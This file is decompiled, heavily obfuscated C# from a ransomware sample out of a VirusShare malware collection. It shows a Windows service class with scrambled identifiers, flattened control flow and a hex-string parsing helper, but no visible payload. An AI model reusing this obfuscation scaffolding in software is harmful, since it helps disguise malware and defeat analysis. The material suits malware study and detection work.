// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႳႼ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Metadata.W3cXsd2001;
using System.ServiceProcess;

namespace Ⴃ
{
  internal sealed class ႳႼ : ServiceBase
  {
    private ႤႳ.Ⴄ Ⴈ = new ႤႳ.Ⴄ();

    public ႳႼ() => this.Ⴀ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    internal static byte[] Ⴈ()
    {
      byte[] numArray = new byte[ႷႭ.Ⴅ() - ႤႥ.Ⴄ() + 1];
      ႷႼ.Ⴗ[170] = (char) ((int) ႷႼ.Ⴗ[170] & (int) ႷႼ.Ⴗ[129] & 22);
      return numArray;
    }

    protected override void Dispose([In] bool obj0)
    {
      byte[] ⴍ = ႣႣ.Ⴍ;
      int num = 2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 3:
            goto label_5;
          case 1:
          case 5:
            IContainer ⴄ = this.Ⴈ.Ⴄ;
            ႷႨ.Ⴐ[287] = (byte) ((int) ႷႨ.Ⴐ[287] + (int) ႷႨ.Ⴐ[433] & 46);
            num = ⴄ == null ? 3 : 6;
            continue;
          case 4:
            goto label_6;
          case 6:
            goto label_4;
          default:
            num = !obj0 ? 3 : (int) ⴍ[45];
            continue;
        }
      }
label_6:
      return;
label_4:
      this.Ⴈ.Ⴄ.Dispose();
label_5:
      base.Dispose(obj0);
    }

    private void Ⴀ()
    {
      this.Ⴈ.Ⴄ = (IDisposable) new Container() as IContainer;
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႭႭ.Ⴈ(typeof (ႷႥ), 7L, 5, 1951761443), (short) 999, 'Ώ');
    }

    static ႳႼ() => ႳႣ.Ⴅ();

    internal static SoapHexBinary Ⴍ<\u0021\u00210>(
      [In] \u0021\u00210 obj0,
      [In] char obj1,
      [In] short obj2)
      where \u0021\u00210 : string
    {
      byte[] ⴍ = ႣႣ.Ⴍ;
      byte[] ⴐ = ႷႨ.Ⴐ;
      char[] ⴗ = ႷႼ.Ⴗ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴐ[15] - (int) ⴐ[526];
      object obj;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_12;
          case 1:
            num2 = (int) ⴗ[102] - 43044;
            continue;
          case 3:
            goto label_3;
          case 4:
          case 10:
            obj = (object) SoapHexBinary.Parse((string) obj0);
            num2 = (int) ⴐ[454] - 6;
            continue;
          case 5:
            ++num1;
            int num3 = (int) obj2;
            num2 = (num3 * num3 + (int) obj2) % 2 == 0 ? 0 : 11;
            continue;
          case 7:
          case 9:
            obj = (object) null;
            num2 = 5;
            continue;
          case 8:
            int num4;
            switch (((int) obj2 ^ (int) obj1) - 122 ^ num1)
            {
              case 0:
                num4 = 4;
                break;
              default:
                num4 = 9;
                break;
            }
            num2 = num4;
            continue;
          case 11:
            num2 = (int) ⴐ[12] / 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႼ.Ⴍ);
            num2 = (int) ⴍ[49];
            continue;
        }
      }
label_12:
      return (SoapHexBinary) obj;
    }
  }
}
